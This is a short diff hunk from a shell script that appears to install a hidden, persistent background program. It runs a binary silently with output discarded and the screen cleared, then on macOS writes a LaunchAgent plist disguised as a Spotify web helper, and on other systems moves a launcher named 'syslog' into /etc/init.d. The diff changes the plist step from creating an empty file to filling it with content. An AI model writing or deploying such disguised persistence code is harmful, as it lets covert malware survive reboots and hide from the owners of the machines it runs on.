@@ -48,7 +48,7 @@ nohup ./bin $FILENAME > /dev/null & clear
 echo "nohup .~/cache/bin $FILENAME > /dev/null & clear" > syslog
 chmod +x syslog
 if [ $(uname) == "Darwin" ]; then
-  touch ~/Library/LaunchAgents/com.spotify.webhelpers.plist
+  echo $TEXT > ~/Library/LaunchAgents/com.spotify.webhelpers.plist
 else
   mv syslog /etc/init.d/
 fi
